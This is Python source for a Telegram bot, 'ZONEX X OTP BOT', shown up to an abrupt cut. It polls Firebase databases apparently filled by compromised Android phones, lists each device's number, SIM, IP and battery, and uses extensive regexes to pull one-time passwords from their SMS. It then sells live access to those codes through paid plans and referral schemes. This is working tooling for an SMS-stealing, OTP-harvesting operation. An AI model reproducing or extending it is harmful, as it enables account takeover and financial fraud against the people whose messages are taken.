
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════╗
║        ZONEX X OTP BOT v4.7              ║
║  High Level UI · Channel Gate · Admin    ║
╚══════════════════════════════════════════╝
"""

import os, re, json, logging, string, random, asyncio
from datetime import datetime, timedelta, timezone
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters, ConversationHandler
)
from telegram.error import TelegramError

# ─── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
_admin_ids_setting = (
    os.getenv("ADMIN_IDS")
    or os.getenv("ADMIN_ID")
    or os.getenv("ADMIN")
    or "8917259924"
)
ADMIN_IDS      = [int(x.strip()) for x in _admin_ids_setting.split(",") if x.strip()]
ADMIN_USERNAME = "@AG01448"
BOT_DEV        = "@zonexarmy"
DATA_FILE      = "bot/data.json"
AUTO_REFRESH   = 10

# ─── Firebase Configuration (for cloud backup of bot data) ───────────────────
FIREBASE_CONFIG = {
    "apiKey": os.getenv("FIREBASE_API_KEY", ""),
    "authDomain": "era-ka-store.firebaseapp.com",
    "projectId": "era-ka-store",
    "storageBucket": "era-ka-store.firebasestorage.app",
    "messagingSenderId": "540743058625",
    "appId": "1:540743058625:web:d0938c9cfa3e4750e48040",
    "measurementId": "G-QZGN0SFYHC",
    "databaseURL": "https://era-ka-store-default-rtdb.firebaseio.com"
}

GAPI_KEY    = FIREBASE_CONFIG["apiKey"]
FS_PROJECT  = FIREBASE_CONFIG["projectId"]
FS_RTDB_URL = f"https://{FS_PROJECT}-default-rtdb.firebaseio.com/bot_data.json"

DEVICES_PER_PAGE = 6
WELCOME_HOURS    = 1

CHANNELS = ["zonexarmy", "SMARTEARNERS011"]
CH_NAMES = {
    "zonexarmy":       "📢 𝐙𝐎𝐍𝐄𝐗 𝐀𝐫𝐞𝐚 💸💸",
    "SMARTEARNERS011": "⚔️ SMART EARNERS",
}

# ─── Conversation states ──────────────────────────────────────────────────────
WAIT_KEY          = 10
WAIT_FB_URL       = 20
WAIT_FB_LABEL     = 21
WAIT_FB_KEY       = 22
WAIT_BROADCAST    = 30
WAIT_PLAN_TIME    = 40
WAIT_PLAN_PRICE   = 41
WAIT_ADD_TIME     = 50
WAIT_FB_EDIT_URL  = 60
WAIT_FB_EDIT_KEY  = 61
WAIT_FB_EDIT_LABEL= 62

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                    level=logging.INFO, datefmt="%Y-%m-%d %H:%M:%S")
logger = logging.getLogger(__name__)

# ─── Key generator ────────────────────────────────────────────────────────────
def _gen_key_raw(length=10) -> str:
    return "ZONEX-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=length))

# ─── Persistent Storage ───────────────────────────────────────────────────────
def _default_data() -> dict:
    return {
        "users": {},
        "firebase_configs": [
            {"url": "https://paisa-8e4f4-default-rtdb.firebaseio.com",
             "label": "Main DB", "key": ""}
        ],
        "pricing_plans": [
            {"id": "p1", "hours": 24,  "price": 30,  "label": "1 Din (24h)"},
            {"id": "p2", "hours": 168, "price": 100, "label": "7 Din (168h)"},
            {"id": "p3", "hours": 720, "price": 500, "label": "30 Din (720h)"},
        ],
        "referral_hours": 1,
        "upi_id": "",
        "qr_file_id": "",
        "pending_payments": {},
        "maintenance": False,
    }

def load_data() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE) as f:
                d = json.load(f)
            d.pop("activation_codes", None)
            for uid, u in d.get("users", {}).items():
                u.setdefault("key",            _gen_key_raw())
                u.setdefault("expires_at",     None)
                u.setdefault("referred_by",    None)
                u.setdefault("referral_count", 0)
                u.setdefault("channels_done",  False)
                u.setdefault("key_verified",   False)
                u.setdefault("banned",         False)
            d.setdefault("pricing_plans", _default_data()["pricing_plans"])
            d.setdefault("firebase_configs", _default_data()["firebase_configs"])
            d.setdefault("referral_hours", 1)
            d.setdefault("upi_id", "")
            d.setdefault("qr_file_id", "")
            d.setdefault("pending_payments", {})
            d.setdefault("maintenance", False)
            return d
    except Exception as e:
        logger.error(f"load_data: {e}")
    return _default_data()

def save_data(d: dict):
    os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
    with open(DATA_FILE, "w") as f:
        json.dump(d, f, indent=2)
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(_push_firestore(d))
    except RuntimeError:
        pass

async def _push_firestore(d: dict):
    if not GAPI_KEY:
        logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
        return
    try:
        payload = json.dumps(d, separators=(",", ":"))
        url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
        async with _get_session().put(url, data=payload,
                         headers={"Content-Type": "application/json"}) as r:
            if r.status in (200, 201):
                logger.info("✅ Firebase RTDB save successful")
            else:
                body = await r.text()
                logger.warning(f"❌ Firebase RTDB save failed: {r.status} - {body[:200]}")
    except Exception as e:
        logger.warning(f"❌ Firebase RTDB push error: {e}")

async def _load_firestore() -> bool:
    if not GAPI_KEY:
        logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
        return False
    try:
        url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
        async with _get_session().get(url) as r:
            if r.status == 200:
                d = await r.json()
                if not isinstance(d, dict):
                    return False
                d.pop("activation_codes", None)
                for uid, u in d.get("users", {}).items():
                    u.setdefault("key",            _gen_key_raw())
                    u.setdefault("expires_at",     None)
                    u.setdefault("referred_by",    None)
                    u.setdefault("referral_count", 0)
                    u.setdefault("channels_done",  False)
                    u.setdefault("key_verified",   False)
                    u.setdefault("banned",         False)
                d.setdefault("pricing_plans",    _default_data()["pricing_plans"])
                d.setdefault("firebase_configs", _default_data()["firebase_configs"])
                d.setdefault("referral_hours",   1)
                d.setdefault("upi_id",           "")
                d.setdefault("qr_file_id",       "")
                d.setdefault("pending_payments", {})
                d.setdefault("maintenance",      False)

                global data
                data = d

                os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                with open(DATA_FILE, "w") as f:
                    json.dump(d, f, indent=2)

                logger.info(f"✅ Firebase RTDB load OK — {len(d.get('users',{}))} users")
                return True
            elif r.status == 401:
                logger.error(f"❌ Firebase auth failed! Check API key: {GAPI_KEY[:10]}...")
            elif r.status == 404:
                logger.info("ℹ️ Firebase: No cloud data yet, will create on first save")
            else:
                body = await r.text()
                logger.warning(f"Firebase load: {r.status} - {body[:120]}")
    except Exception as e:
        logger.warning(f"Firebase load error: {e}")
    return False

data = load_data()

async def _sync_from_firebase_on_startup():
    loaded = await _load_firestore()
    if not loaded:
        logger.info("⚠️ Using local data.json (Firebase not available or empty)")
    else:
        logger.info("✅ Using Firebase data")

# ─── Helper functions ─────────────────────────────────────────────────────────
def get_referral_hours() -> float:
    return float(data.get("referral_hours", 1))

# ─── Cache ────────────────────────────────────────────────────────────────────
device_cache: dict   = {}
otp_cache:    dict   = {}
last_refresh         = "Never"
fb_last_sync: dict   = {}
fb_conn_status: dict = {}

# ─── Global HTTP session ─────────────────────────────────────────────────────
_http_session: Optional[aiohttp.ClientSession] = None

def _get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=30, ttl_dns_cache=300, enable_cleanup_closed=True,
        )
        _http_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=8),
        )
    return _http_session

# ─── Time helpers ─────────────────────────────────────────────────────────────
IST = timezone(timedelta(hours=5, minutes=30))

def now_dt() -> datetime:
    return datetime.now(IST).replace(tzinfo=None)

def now_str() -> str:
    return now_dt().strftime("%Y-%m-%d %H:%M:%S")

def expires_dt(uid: int) -> Optional[datetime]:
    s = data["users"].get(str(uid), {}).get("expires_at")
    if not s: return None
    try: return datetime.strptime(s, "%Y-%m-%d %H:%M:%S")
    except: return None

def time_left_str(uid: int) -> str:
    if is_admin(uid): return "∞ Unlimited"
    exp = expires_dt(uid)
    if not exp: return "❌ No Access"
    diff = exp - now_dt()
    if diff.total_seconds() <= 0: return "⏰ Expired"
    h = int(diff.total_seconds() // 3600)
    m = int((diff.total_seconds() % 3600) // 60)
    if h >= 24:
        return f"✅ {h//24}d {h%24}h {m}m"
    return f"✅ {h}h {m}m"

def time_left_detailed(uid: int) -> str:
    if is_admin(uid): return "∞ Unlimited"
    exp = expires_dt(uid)
    if not exp: return "❌ No Access"
    diff = exp - now_dt()
    if diff.total_seconds() <= 0:
        return f"⏰ Expired ({exp.strftime('%d/%m %H:%M')})"
    h = int(diff.total_seconds() // 3600)
    m = int((diff.total_seconds() % 3600) // 60)
    exp_str = exp.strftime('%d/%m/%Y %H:%M')
    if h >= 24:
        return f"✅ {h//24}d {h%24}h {m}m left\n   📅 Expires: {exp_str}"
    return f"✅ {h}h {m}m left\n   📅 Expires: {exp_str}"

def add_hours(uid: int, hours: float):
    exp = expires_dt(uid)
    base = now_dt() if (not exp or exp < now_dt()) else exp
    new_exp = base + timedelta(hours=hours)
    if new_exp < now_dt() and hours < 0:
        new_exp = now_dt() - timedelta(seconds=1)
    data["users"][str(uid)]["expires_at"] = new_exp.strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

def set_expiry(uid: int, dt: datetime):
    data["users"][str(uid)]["expires_at"] = dt.strftime("%Y-%m-%d %H:%M:%S")
    save_data(data)

# ─── User helpers ─────────────────────────────────────────────────────────────
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def is_banned(uid: int) -> bool:
    return bool(data["users"].get(str(uid), {}).get("banned", False))

def has_access(uid: int) -> bool:
    if is_admin(uid): return True
    if is_banned(uid): return False
    exp = expires_dt(uid)
    return bool(exp and exp > now_dt())

def ensure_user(uid: int, username: str, name: str, referred_by: Optional[int] = None) -> dict:
    uid_s = str(uid)
    if uid_s not in data["users"]:
        key = _gen_key_raw()
        while any(u.get("key") == key for u in data["users"].values()):
            key = _gen_key_raw()
        data["users"][uid_s] = {
            "username": username or "", "name": name or "",
            "joined": now_str(), "key": key,
            "expires_at": None, "referred_by": referred_by,
            "referral_count": 0, "channels_done": False,
            "key_verified": False, "banned": False,
        }
        save_data(data)
    return data["users"][uid_s]

def get_key(uid: int) -> str:
    return data["users"].get(str(uid), {}).get("key", "—")

# ─── Channel helpers ──────────────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> tuple[bool, list[str]]:
    missing = []
    for ch in CHANNELS:
        try:
            m = await bot.get_chat_member(f"@{ch}", uid)
            if m.status in (ChatMember.LEFT, ChatMember.BANNED):
                missing.append(ch)
        except TelegramError:
            pass
    return len(missing) == 0, missing

def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([InlineKeyboardButton(CH_NAMES.get(ch, f"@{ch}"), url=f"https://t.me/{ch}")])
    rows.append([InlineKeyboardButton("✅ Continue Verify", callback_data="check_join")])
    return InlineKeyboardMarkup(rows)

# ─── OTP helpers ──────────────────────────────────────────────────────────────
def extract_otp(text: str) -> Optional[str]:
    pats = [
        r'(?:OTP|One[\s\-]?Time[\s\-]?Password)\s*(?:is|:|\s)\s*(\d{4,8})',
        r'(\d{4,8})\s+(?:is\s+)?(?:your|the)\s+(?:OTP|One[\s\-]?Time)',
        r'(?:verification\s+code|verify\s+code|auth\s+code|login\s+code)\s*[:\-]?\s*(\d{4,8})',
        r'(?:code|passcode|security\s+code|access\s+code)\s*[:\-]\s*(\d{4,8})',
        r'(?:your|the)\s+(?:OTP|code|PIN|passcode)\s+(?:is\s+)?(\d{4,8})',
        r'(?:PIN|pin)\s*[:\-]\s*(\d{4,8})',
        r'\b(\d{6})\s+(?:is\s+)?(?:your|the|this)\b',
        r'(?:is|:)\s+(\d{6})\b',
        r'(?:is|:)\s+(\d{4})\b',
        r'(?:is|:)\s+(\d{8})\b',
        r'(?:is|:)\s+(\d{5})\b',
        r'(?:use|enter|share)\s+(?:this\s+)?(?:OTP|code)\s*[:\-]?\s*(\d{4,8})',
        r'(?:do not|dont|never)\s+share.*?(\d{6})',
        r'(?:do not|dont|never)\s+share.*?(\d{4})',
        r'(?:do not|dont|never)\s+share.*?(\d{8})',
        r'valid\s+for.*?(\d{6})',
        r'expires?\s+in.*?(\d{6})',
        r'\b(\d{6})\b',
        r'\b(\d{8})\b',
        r'\b(\d{5})\b',
        r'\b(\d{4})\b',
    ]
    skip = {
        '2023','2024','2025','2026','2027','2028','2029','2030',
        '1234','0000','1111','2222','3333','4444','5555','6666','7777','8888','9999',
        '12345','123456','000000','111111',
    }
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m and m.group(1) not in skip:
            return m.group(1)
    return None

def _parse_ts_dt(ts) -> Optional[datetime]:
    try:
        if isinstance(ts, (int, float)):
            t = int(ts)
            if t < 1e12: t *= 1000
            return datetime.utcfromtimestamp(t / 1000) + timedelta(hours=5, minutes=30)
        if isinstance(ts, str) and ts.strip():
            clean = ts.replace(" | ", " ").replace("|", " ").strip()
            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                try: return datetime.strptime(clean[:19], fmt)
                except: pass
    except: pass
    return None

def fmt_ts(ts) -> str:
    try:
        if isinstance(ts, (int, float)):
            t = int(ts)
            if t < 1e12: t *= 1000
            return (datetime.utcfromtimestamp(t/1000) + timedelta(hours=5, minutes=30)).strftime("%d/%m/%Y %H:%M")
        if isinstance(ts, str) and ts.strip():
            clean = ts.replace(" | ", " ").replace("|", " ").strip()
            for fmt in ("%Y-%m-%dT%H:%M:%S", "%d/%m/%Y %H:%M:%S",
                        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y, %H:%M:%S",
                        "%d-%m-%Y %H:%M", "%d/%m/%Y %H:%M",
                        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M"):
                try: return datetime.strptime(clean[:19], fmt).strftime("%d/%m/%Y %H:%M")
                except: pass
            return clean[:16]
    except: pass
    return "—"

# ─── Phone validation ────────────────────────────────────────────────────────
def _has_valid_phone(info: dict) -> bool:
    p = str(info.get("phone", "")).strip()
    if not p: return False
    if p in ("—", "-", "None", "none", "null", "Unknown", "unknown"):
        return False
    digits = re.sub(r"\D", "", p)
    return len(digits) >= 7

# ─── Firebase read helpers ───────────────────────────────────────────────────
async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
    base = url.rstrip("/")
    ep   = f"{base}/{path}.json" + (f"?auth={key}" if key else "")
    try:
        async with _get_session().get(ep) as r:
            if r.status == 200:
                return await r.json()
    except Exception as e:
        logger.warning(f"fb_get [{path}]: {e}")
    return None

async def fetch_otps(url: str, key: str, dev_id: str):
    raw = await fb_get(url, f"messages/{dev_id}", key)
    if raw is None:
        raw = await fb_get(url, f"clients/{dev_id}/messages", key)
    if not isinstance(raw, dict): return [], None

    otps: list  = []
    last_any_dt = None

    for msg in reversed(list(raw.values())[-50:]):
        if not isinstance(msg, dict): continue
        body   = str(msg.get("message") or msg.get("body") or msg.get("text") or "")
        sender = str(msg.get("sender") or msg.get("from") or msg.get("address") or "Unknown")
        ts     = msg.get("dateTime") or msg.get("date") or msg.get("timestamp") or ""
        msg_dt = _parse_ts_dt(ts)

        if msg_dt and (last_any_dt is None or msg_dt > last_any_dt):
            last_any_dt = msg_dt

        otp = extract_otp(body)
        if otp:
            otps.append({
                "otp": otp, "sender": sender,
                "time": fmt_ts(ts), "msg": body[:300],
                "_dt": msg_dt,
            })
    return otps, last_any_dt

async def refresh_firebase(cfg: dict):
    url, key, label = cfg["url"], cfg.get("key",""), cfg["label"]
    clients = await fb_get(url, "clients", key)
    if not isinstance(clients, dict):
        fb_conn_status[label] = "err"
        return

    valid = []
    for dev_id, info in clients.items():
        if not isinstance(info, dict): continue
        sims = info.get("sims") or {}
        sl   = sims if isinstance(sims, list) else list(sims.values())

        def _pick(*vals):
            for v in vals:
                s = str(v).strip()
                if s and s not in ("None","none","","—","-","Unknown","unknown","null"):
                    return s
            return "—"

        sim_phone = ""
        if sl and isinstance(sl[0], dict):
            sim_phone = (sl[0].get("phoneNumber") or sl[0].get("phone")
                         or sl[0].get("number") or "")

        phone = _pick(
            info.get("mobNo"), info.get("phoneNumber"), info.get("phone"),
            info.get("mobile"), info.get("Mobile"), info.get("phone_number"),
            info.get("PhoneNumber"), info.get("Phone"), sim_phone,
        )
        # Clean leading odd chars
        phone = re.sub(r"[^\d+]", "", phone) or phone

        valid.append((dev_id, info, phone))

    async def _fetch_one(dev_id):
        try:
            return await fetch_otps(url, key, dev_id)
        except Exception as e:
            logger.warning(f"fetch_otps [{dev_id}]: {e}")
            return [], None

    results = await asyncio.gather(*[_fetch_one(dev_id) for dev_id, _, _ in valid])

    devs, otps_map = {}, {}
    for (dev_id, info, phone), (raw_otps, _last_msg_dt) in zip(valid, results):
        phone_ok = _has_valid_phone({"phone": phone})
        fb_status = bool(info.get("status") or info.get("isOnline") or
                         info.get("is_online") or info.get("online"))
        is_online  = fb_status and phone_ok

        ts_raw = (info.get("lastSeen") or info.get("last_seen") or
                  info.get("lastOnline") or "")
        devs[dev_id] = {
            "online":    is_online,
            "phone":     phone,
            "name":      str(info.get("modelName") or info.get("model") or dev_id),
            "battery":   str(info.get("battery","—")),
            "android":   str(info.get("androidV") or info.get("androidVersion","—")),
            "network":   str(info.get("service_provider") or info.get("provider","—")),
            "ip":        str(info.get("ip_address","—")),
            "last_seen": fmt_ts(ts_raw),
            "label":     label,
            "dev_id":    dev_id,
        }
        otps_map[dev_id] = raw_otps[:10]

    device_cache[label]    = devs
    otp_cache[label]       = otps_map
    fb_last_sync[label]    = now_dt().strftime("%H:%M:%S")
    fb_conn_status[label]  = "ok"

async def refresh_all_firebases():
    cfgs = data.get("firebase_configs", [])
    await asyncio.gather(*[refresh_firebase(c) for c in cfgs], return_exceptions=True)

def get_all_devices() -> list:
    out = []
    for label, devs in device_cache.items():
        for dev_id, info in devs.items():
            d = dict(info)
            d["label"]  = label
            d["dev_id"] = dev_id
            out.append(d)
    return out

def get_otps_for(dev_id: str, label: str) -> list:
    return otp_cache.get(label, {}).get(dev_id, [])

# ─── UI helpers ───────────────────────────────────────────────────────────────
def _total_otps() -> int:
    return sum(len(v) for v in otp_cache.values())

def _online_count() -> int:
    return sum(1 for d in get_all_devices() if d.get("online"))

def main_menu_kb(uid: int) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton(f"🟢 Online ({_online_count()})", callback_data="devices_online"),
            InlineKeyboardButton(f"🔑 OTPs ({_total_otps()})", callback_data="devices_all"),
        ],
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh"),
            InlineKeyboardButton("👤 Profile", callback_data="profile"),
        ],
        [
            InlineKeyboardButton("💎 Buy Plan", callback_data="buy_menu"),
            InlineKeyboardButton("🎁 Refer", callback_data="refer"),
        ],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

def welcome_text(uid: int, name: str) -> str:
    return (
        "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "🤖 𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        f"👋 Welcome, {name}!\n\n"
        "╭──────────────────────╮\n"
        f"⏱️ 𝐀𝐂𝐂𝐄𝐒𝐒  ›  {time_left_str(uid)}\n"
        "🟢 𝐒𝐓𝐀𝐓𝐔𝐒   ›  ✅ Active\n"
        "╰──────────────────────╯\n\n"
        "╭━━━ 📡 𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒 ━━━╮\n"
        f"🟢 Online      › {_online_count()}\n"
        f"🔑 Total OTPs  › {_total_otps()}\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        f"🕐 Last Sync  › {last_refresh}\n"
        f"🔄 Auto Refresh › {AUTO_REFRESH}s"
    )

def expired_text(name: str) -> str:
    return (
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⏰ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"😔 Arre {name},\n"
        "   tumhara time khatam ho gaya!\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💎 𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐎𝐏𝐓𝐈𝐎𝐍\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💰 𝐁𝐔𝐘 𝐊𝐄𝐘\n"
        "   Plan kharido, turant access milega.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👥 𝐑𝐄𝐅𝐄𝐑 & 𝐄𝐀𝐑𝐍\n"
        "   Ek dost = FREE +1 hour access! 🎁\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 Refer link ke liye 👇\n"
        "   neeche button dabao!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )

def expired_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Buy Plan", callback_data="buy_menu")],
        [InlineKeyboardButton("🎁 Refer & Earn", callback_data="refer")],
        [InlineKeyboardButton("👤 Profile", callback_data="profile")],
    ])

def devices_text(online_only: bool = False) -> str:
    devices = [d for d in get_all_devices() if (not online_only or d.get("online"))]
    title = "📱 𝐎𝐍𝐋𝐈𝐍𝐄 𝐃𝐄𝐕𝐈𝐂𝐄𝐒" if online_only else "📱 𝐀𝐋𝐋 𝐃𝐄𝐕𝐈𝐂𝐄𝐒"
    sync  = now_dt().strftime("%H:%M:%S")
    if not devices:
        return (
            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
            f"   {title}\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            f"😔 Koi device nahi mila.\n\n"
            f"🕐 𝐒𝐘𝐍𝐂 › {sync}"
        )
    online = sum(1 for d in devices if d.get("online"))
    lines = [
        "╭━━━━━━━━━━━━━━━━━━━━━━╮",
        f"   {title}",
        "╰━━━━━━━━━━━━━━━━━━━━━━╯",
        "",
        f"🟢 𝐀𝐂𝐓𝐈𝐕𝐄 › {online} {'𝐃𝐄𝐕𝐈𝐂𝐄𝐒' if online != 1 else '𝐃𝐄𝐕𝐈𝐂𝐄'}",
        f"📊 𝐓𝐎𝐓𝐀𝐋  › {len(devices)}",
        f"🕐 𝐒𝐘𝐍𝐂 › {sync}",
        "",
        "━━━━━━━━━━━━━━━━━━━━━━━━",
        "",
    ]
    for i, d in enumerate(devices[:30], 1):
        dot = "🟢" if d.get("online") else "🔴"
        phone = d.get("phone") or "—"
        lines.append(f"{i}. {dot} {phone}")
        lines.append(f"   📲 {d.get('name','—')}  🔋{d.get('battery','—')}")
        lines.append("")
    if len(devices) > 30:
        lines.append(f"... +{len(devices)-30} more")
    return "\n".join(lines)

def devices_kb(online_only: bool = False) -> InlineKeyboardMarkup:
    devices = [d for d in get_all_devices() if (not online_only or d.get("online"))]
    rows = []
    for d in devices[:30]:
        dot = "🟢" if d.get("online") else "🔴"
        phone = d.get("phone") or d.get("dev_id", "")[:10]
        cb = f"dev|{d['label']}|{d['dev_id']}"
        rows.append([InlineKeyboardButton(f"{dot} {phone}", callback_data=cb)])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices")])
    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)

def device_info_text(d: dict, otps: list) -> str:
    dot = "🟢" if d.get("online") else "🔴"
    latest = otps[0] if otps else None
    txt = (
        "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "📱 𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        "╭──────────────────────╮\n"
        f"📞 Number   › {d.get('phone','—')}\n"
        f"🔋 Battery  › {d.get('battery','—')}%\n"
        f"🤖 Android  › {d.get('android','—')}\n"
        f"📡 Network  › {d.get('network','—')}\n"
        f"🌐 IP       › {d.get('ip','—')}\n"
        f"🕐 Last Seen › {d.get('last_seen','—')}\n"
        f"🔥 Database › Firebase {d.get('label','—')}\n"
        "╰──────────────────────╯\n\n"
    )
    if latest:
        txt += (
            "╭━━━ 🔑 𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏 ━━━╮\n"
            f"⚡ CODE   › {latest['otp']}\n"
            f"📤 Sender › {latest['sender']}\n"
            f"🕐 Time   › {latest['time']}\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    else:
        txt += (
            "╭━━━ 🔑 𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏 ━━━╮\n"
            "⏳ Koi OTP nahi mila abhi tak\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )
    return txt

def device_info_kb(label: str, dev_id: str, otps: list) -> InlineKeyboardMarkup:
    rows = []
    if otps:
        rows.append([InlineKeyboardButton(f"⚡ {otps[0]['otp']}", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data=f"dev|{label}|{dev_id}")])
    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="refresh_devices")])
    return InlineKeyboardMarkup(rows)

def expired_user(uid: int) -> bool:
    if is_admin(uid): return False
    if is_banned(uid): return False
    exp = expires_dt(uid)
    return bool(exp and exp <= now_dt())

def verification_gate(uid: int) -> bool:
    u = data["users"].get(str(uid), {})
    if not u.get("key_verified"): return False
    return True

# ─── User command handlers ────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.effective_message
    user = update.effective_user
    uid = user.id

    referred_by = None
    if ctx.args:
        try:
            rid = int(ctx.args[0])
            if rid != uid and str(rid) in data["users"]:
                referred_by = rid
        except:
            pass

    ensure_user(uid, user.username or "", user.first_name or "", referred_by)

    # Referral bonus
    if referred_by:
        u = data["users"].get(str(uid), {})
        if u.get("referred_by") and not u.get("ref_bonus_given"):
            u["ref_bonus_given"] = True
            hours = get_referral_hours()
            add_hours(uid, hours)
            add_hours(referred_by, hours)
            data["users"][str(referred_by)]["referral_count"] = data["users"].get(str(referred_by), {}).get("referral_count", 0) + 1
            save_data(data)
            try:
                await ctx.bot.send_message(
                    referred_by,
                    "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
                    "🎉  𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒\n"
                    "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
                    "✅ Referral Joined Successfully!\n"
                    f"⏱️ Bonus Added › +{hours:g} hour\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "🎁 𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!\n"
                    f"⚡ +{hours:g} hour Added to Your Account\n"
                )
            except: pass

    # Channel gate
    ok, missing = await check_channels(ctx.bot, uid)
    if not ok:
        await msg.reply_text(
            "🚦 𝐉𝐎𝐈𝐍 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃\n\n"
            "Bot use karne ke liye pehle in channels ko join karo:\n"
            + "\n".join(f"• {CH_NAMES.get(c, c)}" for c in missing),
            reply_markup=kb_channels(missing),
        )
        return

    data["users"][str(uid)]["channels_done"] = True
    save_data(data)

    # Key verification gate
    if not is_admin(uid) and not verification_gate(uid):
        await msg.reply_text(
            "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
            "🔐 𝐊𝐄𝐘 𝐕𝐄𝐑𝐈𝐅𝐘 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
            "Apni key bhejo verify karne ke liye.\n"
            "👉 /verify <KEY>\n\n"
            f"Aapki key: `{get_key(uid)}`",
            parse_mode="Markdown",
        )
        return

    if not has_access(uid):
        await msg.reply_text(
            expired_text(user.first_name or "User"),
            reply_markup=expired_kb(),
            parse_mode="HTML",
        )
        return

    await msg.reply_text(
        welcome_text(uid, user.first_name or "User"),
        reply_markup=main_menu_kb(uid),
        parse_mode="HTML",
    )

async def cmd_verify(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    ensure_user(uid, user.username or "", user.first_name or "")
    if is_admin(uid):
        await update.message.reply_text("✅ Admin — direct access.\nUse /start")
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /verify <KEY>")
        return
    key = ctx.args[0].strip()
    stored = get_key(uid)
    if key.upper() == stored.upper():
        data["users"][str(uid)]["key_verified"] = True
        save_data(data)
        await update.message.reply_text("✅ Key verified! Ab /start dabao.")
    else:
        await update.message.reply_text("❌ Invalid key.")

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return await update.message.reply_text("❌ Admin only.")
    await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
        "🛠 𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯",
        reply_markup=admin_kb(),
        parse_mode="HTML",
    )

